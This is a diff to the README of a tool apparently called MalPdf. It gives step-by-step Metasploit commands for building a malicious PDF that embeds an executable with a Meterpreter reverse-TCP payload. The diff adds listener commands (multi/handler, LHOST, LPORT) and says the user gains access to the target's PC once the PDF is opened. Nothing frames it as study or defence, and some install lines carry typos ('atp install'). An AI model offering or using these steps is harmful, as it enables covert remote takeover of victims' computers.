@@ -14,11 +14,11 @@ First start your command prompt or power shell
 
 Type the command:
 
-$apt install git
-
-$git clone https://github.com/Nicko15/MalPdf.git
-
-$cd MalPdf
+apt install git
+atp install sudo
+atp install bash
+git clone https://github.com/Nicko15/MalPdf.git
+cd MalPdf
 
 
 Now run the 'setup.sh' file by typing:
@@ -31,7 +31,7 @@ Now to create malicious pdf and use, type
 
 $cd metasploit-framework
 
-$msfconsole
+msfconsole
 sudo bash create.sh
 use exploit/windows/fileformat/adobe_pdf_embedded_exe
 set payload windows/meterpreter/reverse_tcp
@@ -48,6 +48,12 @@ cd ..
 
 To listen to the pdf, type:
 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set LPORT 4444
+set LHOST <your_ip>
+run
 
 Replace <your_ip> with your ip address
 Now your pc will start listening. As soon as your target opens the pdf, you will get access over his pc
